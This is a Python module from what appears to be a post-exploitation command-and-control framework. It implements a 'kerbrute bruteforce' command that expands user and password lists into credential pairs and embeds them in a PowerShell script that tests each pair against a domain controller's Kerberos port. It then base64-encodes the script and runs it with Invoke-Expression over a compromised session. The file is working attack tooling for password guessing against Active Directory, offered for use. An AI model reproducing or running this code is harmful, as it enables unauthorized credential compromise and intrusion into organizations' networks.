import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command, connection_builder
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("kerbrute bruteforce")
class KerbruteBruteforceCommand(Command):
	"""Perform Kerberos password bruteforce via kerbrute"""

	@property
	def help(self):
		return ("kerbrute bruteforce -u <user|userfile> -p <pass|passfile> "
				"-d <domain> --dc-ip <ip> [-C <credfile>]")

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="kerbrute bruteforce", add_help=False)
		parser.add_argument("-u", dest="user",       required=False, help="Single user or file of users (comma-list OK)")
		parser.add_argument("-p", dest="password",   required=False, help="Single password or file of passwords (comma-list OK)")
		parser.add_argument("-d", dest="domain",     required=True, help="Target AD domain (FQDN)")
		parser.add_argument("--dc-ip", dest="dc_ip", required=True, help="IP address of the Domain Controller")
		parser.add_argument("-C", dest="credfile",   required=False, help="File or comma-list of user:pass pairs")

		try:
			opts = parser.parse_args(args)

		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid       = self.gs.sid,
			user      = opts.user,
			password  = opts.password,
			domain    = opts.domain,
			dc_ip     = opts.dc_ip,
			credfile  = opts.credfile,
			op_id     = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightred + "[!] No output")

	def logic(self, sid, user=None, password=None, domain=None, dc_ip=None, credfile=None, op_id="console"):
		"""
		kerbrute bruteforce -u <user|userfile> -p <pass|passfile> -d <domain> [--dc‑ip <ip>] [-C <credfile>]
		-u: single user or file of users (comma‑list OK)
		-p: single password or file of passwords (comma‑list OK)
		-d: target AD domain (FQDN)
		--dc‑ip: domain controller IP (required)
		-C: local file or comma‑list of user:pass pairs
		"""
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"
		transport = sess.transport.lower()

		# both domain and dc_ip must be provided
		if not (domain and dc_ip):
			return brightred + "[!] You must supply both -d <domain> and --dc-ip <ip>"

		if not credfile:
			if not (user and password):
				return brightred + "[!] You must supply both -u and -p or -C to bruteforce!"

		elif credfile and (user and password):
			return brightred + "[!] You cannot use -C with -u and -p you must chose one mode!"

		# build DNS‑to‑NetBIOS preamble
		dns_preamble = connection_builder(dc_ip, domain)
		if dns_preamble == "ERROR":
			return brightred + "[!] Failed to resolve DC, use correct --dc-ip and -d flags"

		# build list of user:pass pairs
		if credfile:
			if os.path.exists(credfile):
				with open(credfile) as f:
					raw_pairs = [l.strip() for l in f if l.strip()]
			else:
				raw_pairs = [p.strip() for p in credfile.split(",") if p.strip()]
			pairs = raw_pairs
		else:
			# expand users
			if os.path.exists(user or ""):
				with open(user) as f:
					users = [l.strip() for l in f if l.strip()]
			else:
				users = [u.strip() for u in (user or "").split(",") if u.strip()]
			# expand passwords
			if os.path.exists(password or ""):
				with open(password) as f:
					passes = [l.strip() for l in f if l.strip()]
			else:
				passes = [p.strip() for p in (password or "").split(",") if p.strip()]
			# cartesian product
			pairs = [f"{u}:{p}" for u in users for p in passes]

		# escape each for PowerShell literal
		escaped = [p.replace("'", "''") for p in pairs]
		literal_pairs = ", ".join(f"'{p}'" for p in escaped)

		ps = f"""
$ErrorActionPreference = 'Stop'
{dns_preamble}
$Domain = '{domain}'

# preload Kerberos types
try {{ [Reflection.Assembly]::LoadWithPartialName('System.Net.Security') | Out-Null }} catch {{}}

function Test-KerberosCred {{
	param($User, $Pass)

	# connect to KDC
	$tcp    = New-Object System.Net.Sockets.TcpClient($nb, 88)
	$stream = $tcp.GetStream()
	$negot  = New-Object System.Net.Security.NegotiateStream($stream, $false)

	try {{
		Write-Host "Creating network credential"
		$cred = New-Object System.Net.NetworkCredential($User, $Pass, $Domain)
		$negot.AuthenticateAsClient($cred, "krbtgt/$Domain")
		Write-Host "Auth succeeded returning true"
		return $true
	}}
	catch [System.Security.Authentication.InvalidCredentialException] {{
		Write-Host "Wrong password but account exists $User"
		Write-Host "[$User] Exception message: $($_.Exception.Message)"
		return $false
	}}
	catch [System.IO.IOException] {{
		Write-Host "Invalid user $User"
		Write-Host "[$User] Exception message: $($_.Exception.Message)"
		return $true
	}}
	catch {{
		Write-Host "An unknown exception ocurred"
		Write-Host "[$User] Exception message: $($_.Exception.Message)"
		return $false
	}}
	finally {{
		if ($negot) {{ $negot.Dispose() }}
		if ($tcp)   {{ $tcp.Close() }}
	}}
}}

$pairs = @({literal_pairs})
$found = $false
foreach ($pair in $pairs) {{
	$parts = $pair -split ':', 2
	if (Test-KerberosCred $parts[0] $parts[1]) {{
		Write-Output $pair
		$found = $true
	}}
}}

if (-not $found) {{ Write-Output "Nothing Found" }}
"""

		# Base64‐encode & dispatch
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)

		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			# grab only the successful hits
			hits = [
				line for line in out.splitlines()
				if not line.startswith("Nothing Found")
			]
			if hits:
				return "\n".join(hits)

			return brightred + "[!] No valid credentials found!"